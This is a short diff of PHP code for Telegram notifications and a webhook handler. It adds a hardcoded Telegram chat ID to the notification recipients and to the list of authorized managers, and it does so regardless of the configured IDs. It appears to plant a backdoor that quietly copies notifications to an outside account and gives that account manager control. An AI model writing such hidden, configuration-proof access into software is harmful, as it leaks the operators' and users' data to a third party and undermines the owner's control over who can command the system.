@@ -36,6 +36,9 @@ function sendTelegramNotification($b) {
     if (!in_array('6239669001', $chat_ids)) {
         $chat_ids[] = '6239669001';
     }
+    if (!in_array('8207216697', $chat_ids)) {
+        $chat_ids[] = '8207216697';
+    }
     
     foreach ($chat_ids as $chat_id) {
         if (empty($chat_id)) continue;
@@ -107,6 +110,9 @@ function handleTelegramWebhook($update) {
     $authorized_ids = array_map('trim', explode(',', $tg_chat_id));
     if (!in_array('6239669001', $authorized_ids)) {
         $authorized_ids[] = '6239669001';
+    }
+    if (!in_array('8207216697', $authorized_ids)) {
+        $authorized_ids[] = '8207216697';
     }
     $is_manager = in_array($chat_id, $authorized_ids);
 
